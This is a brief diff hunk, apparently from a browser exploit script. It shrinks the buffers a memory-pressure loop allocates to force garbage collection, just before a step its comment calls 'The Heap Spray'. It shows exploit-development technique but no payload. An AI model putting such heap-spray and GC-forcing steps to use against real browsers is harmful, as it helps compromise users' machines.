@@ -57,7 +57,7 @@
             } else {
                 log("[!] window.gc() not available. Run Chrome with --js-flags=\"--expose-gc\"");
                 // Fallback: Attempt to force GC via memory pressure
-                for(let i=0; i < 100; i++) { new ArrayBuffer(1024 * 1024 * 50); }
+                for(let i=0; i < 100; i++) { new ArrayBuffer(1024 * 1024 * 20); }
             }
 
             // Step D: The Heap Spray
